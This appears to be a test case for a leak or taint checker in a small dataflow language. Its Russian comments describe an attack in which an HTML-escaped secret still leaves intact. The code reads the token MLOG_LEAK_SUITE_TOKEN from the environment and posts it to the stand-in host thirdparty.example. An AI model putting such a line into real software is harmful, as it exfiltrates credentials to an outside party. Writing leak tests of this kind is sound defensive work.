// Угроза: экранированный секрет уходит третьему сервису в теле HTTP-запроса.
// Атака: escape_html не понижает конфиденциальность (A2) — bearer-токен
// доставлен внешнему хосту целым (позиционная логика http_post: arg 1 — body).
pattern Send(data: String) -> String {
  let _ = http_post("https://thirdparty.example/report", escape_html(env("MLOG_LEAK_SUITE_TOKEN")))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
